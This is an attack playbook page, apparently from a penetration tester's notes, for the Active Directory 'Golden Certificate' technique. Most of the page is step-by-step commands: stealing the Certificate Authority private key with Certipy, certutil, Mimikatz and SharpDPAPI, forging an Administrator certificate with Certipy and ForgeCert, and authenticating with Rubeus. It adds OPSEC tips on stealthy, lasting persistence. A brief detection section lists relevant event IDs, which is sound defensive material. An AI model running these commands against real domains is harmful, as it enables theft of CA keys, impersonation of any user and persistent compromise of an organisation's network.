---
title: "Attack #35 — Golden Certificate Attack"
description: "The Golden Certificate attack is the ADCS equivalent of a Golden Ticket. By stealing the Certificate Authority's private key and CA certificate, an…"
category: active-directory
tags: ["active-directory", "adcs", "kerberos"]
tools: ["Mimikatz", "Rubeus", "Certipy", "PowerShell"]
difficulty: advanced
updated: "2026-08-10"
source: "vault:ActiveDirectory/AD-Attack/Category-Four/🟢 Attack #35 — Golden Certificate Attack.md"
---
# 🟢 Attack #35 — Golden Certificate Attack

***

## 📖 How It Works

The Golden Certificate attack is the **ADCS equivalent of a Golden Ticket**. By stealing the Certificate Authority's **private key** and **CA certificate**, an attacker can **forge certificates for any user** entirely offline — without ever touching the CA again. These forged certificates are indistinguishable from legitimate ones because they're signed by the real CA private key.

### Impact

- **Forge certificates for any user** — DA, EA, service accounts
- **Completely offline** — no CA interaction needed after key theft
- **Survives** password resets, KRBTGT rotation, and most remediation
- **Only remediation**: revoke the CA certificate and rebuild the PKI

***

## ⚙️ Prerequisites

| Requirement | Detail |
|---|---|
| **Local admin on CA server** | To extract the CA private key |
| **CA private key exportable** | Default in most deployments |
| **Or**: backup of CA key | From `certutil -backup` or DPAPI extraction |

***

## 🛠️ Tools

| Tool | Platform | Notes |
|---|---|---|
| **Certipy** | Linux | `backup` command to extract CA key + cert |
| **SharpDPAPI** | Windows | DPAPI-based CA key extraction |
| **Mimikatz** | Windows | `crypto::capi` / `crypto::cng` for CA key export |
| **certutil** | Windows | Native CA backup |
| **ForgeCert** | Windows | Forge certificates using stolen CA key |

***

## 💻 Full Commands

### 🔴 Step 1 — Extract CA Private Key

```bash
# ── Certipy backup (from Linux — requires admin on CA) ────────────────────────
certipy ca -u Administrator@corp.local -p 'Password1' \
  -ca CORP-CA -backup -dc-ip 10.10.10.10
# Outputs: CORP-CA.pfx (contains CA certificate + private key)
```

```powershell
# ── certutil (on the CA server) ───────────────────────────────────────────────
certutil -backup C:\Temp\ca_backup p@ssword
# Exports CA cert + key to C:\Temp\ca_backup\

# ── Mimikatz — export CA key ──────────────────────────────────────────────────
privilege::debug
crypto::capi
crypto::certificates /export /systemstore:LOCAL_MACHINE

# ── SharpDPAPI — extract from DPAPI-protected store ──────────────────────────
.\SharpDPAPI.exe certificates /machine
```

### 🔴 Step 2 — Forge Certificate for Any User

```bash
# ── Certipy — forge certificate as Administrator ─────────────────────────────
certipy forge -ca-pfx CORP-CA.pfx -upn Administrator@corp.local \
  -subject 'CN=Administrator,CN=Users,DC=corp,DC=local'
# Output: forged_administrator.pfx

# ── Authenticate ──────────────────────────────────────────────────────────────
certipy auth -pfx forged_administrator.pfx -dc-ip 10.10.10.10
# Returns Administrator NT hash + TGT
```

```powershell
# ── ForgeCert (Windows) ───────────────────────────────────────────────────────
.\ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword "p@ssword" \
  --Subject "CN=Administrator,CN=Users,DC=corp,DC=local" \
  --SubjectAltName "Administrator@corp.local" \
  --NewCertPath forged.pfx --NewCertPassword "FakePass"

# Use Rubeus for PKINIT authentication
.\Rubeus.exe asktgt /user:Administrator /certificate:forged.pfx \
  /password:FakePass /ptt
```

***

## 🎯 OPSEC Tips

- **Golden Certificate = permanent, stealthy persistence** — harder to remediate than Golden Ticket
- **CA key theft requires CA server admin access** — this is a post-DA persistence technique
- **Unlike Golden Ticket, KRBTGT rotation does NOT invalidate Golden Certificates**
- **Only fix**: full PKI rebuild — revoke old CA cert, issue new one, re-enroll all certificates

***

## 🛡️ Detection — Event IDs

| Event ID | Source | What to Look For |
|---|---|---|
| **4768** | Security Log (DC) | PKINIT authentication with certificates not in CA database |
| **4886/4887** | Security Log (CA) | Missing — forged certs bypass CA logging entirely |

**Key detection challenge:** The CA never issued the forged certificate, so there's no enrollment event. Detection must focus on **PKINIT authentication events** where the presented certificate serial number doesn't exist in the CA's issued certificate database.

***

## 🔗 Attack Chain Context

```
[Golden Certificate] ──→ Permanent Domain Persistence via PKI
         │
         ├──→ 🔒 Survives: password resets, KRBTGT rotation, DA removal
         ├──→ 💀 Only remediation: full PKI rebuild
         ├──→ 🔗 Prereqs: admin on CA server (via DA)
         └──→ 📊 Persistence ranking: Golden Certificate > Golden Ticket
```

***

> ✅ **Attack #35 — Golden Certificate complete.**
